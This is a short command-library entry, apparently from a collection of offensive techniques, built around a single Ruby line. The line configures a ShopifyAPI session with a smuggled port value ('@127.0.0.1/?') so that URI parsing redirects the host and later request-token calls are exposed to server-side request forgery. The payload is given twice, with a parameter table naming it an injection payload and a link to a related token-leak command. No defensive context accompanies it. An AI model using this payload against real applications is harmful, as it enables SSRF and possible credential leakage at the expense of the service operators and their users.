---
id: cmd-uuid-4
data: 'ShopifyAPI::Session.setup protocol:''https'',secret:'''',port:''@127.0.0.1/?'''
tags:
  - exploitation
  - ssrf
  - shopify
type: command
output: 'Configuration applied, leading to SSRF on request_token'
executor: ruby
platforms:
  - Ruby
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:18.753Z'
verified: false
validated: true
submitted: true
---
# setup-session-with-malicious-port

## Command

```ruby
ShopifyAPI::Session.setup protocol:'https',secret:'',port:'@127.0.0.1/?'
```

## Description

Sets up the session with a malicious port injection to override host via URI parsing quirks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| protocol | Scheme ('https') | Yes |
| secret | Empty for testing | Yes |
| port | Injection payload ('@127.0.0.1/?') | Yes |

## Examples

### Basic Usage

```ruby
ShopifyAPI::Session.setup protocol:'https',secret:'',port:'@127.0.0.1/?'
```

## Expected Output

Configuration applied; enables SSRF in subsequent requests.

## Related

- [[commands/request-token-with-leak]]
